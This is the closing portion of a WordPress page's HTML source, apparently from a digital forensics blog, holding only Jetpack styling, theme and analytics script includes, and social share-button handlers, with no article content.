.wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.6.2" id="freenews-navigation-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.6.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.6.2" id="ResizeSensor-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.6.2" id="theia-sticky-sidebar-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.6.2" id="slick-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.6.2" id="freenews-slick-settings-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.6.2" id="jquery-sticky-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.6.2" id="freenews-sticky-settings-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.6.2" id="marquee-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.6.2" id="freenews-marquee-settings-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://stats.wp.com/e-202443.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"38756\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:13.9.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "38756" ]);
/* ]]> */
</script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=13.9.1" id="google-translate-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=13.9.1" id="jetpack-block-subscriptions-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="bc235b954ff2c1b7a3b0088b-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="bc235b954ff2c1b7a3b0088b-|49" defer></script></body>
</html>
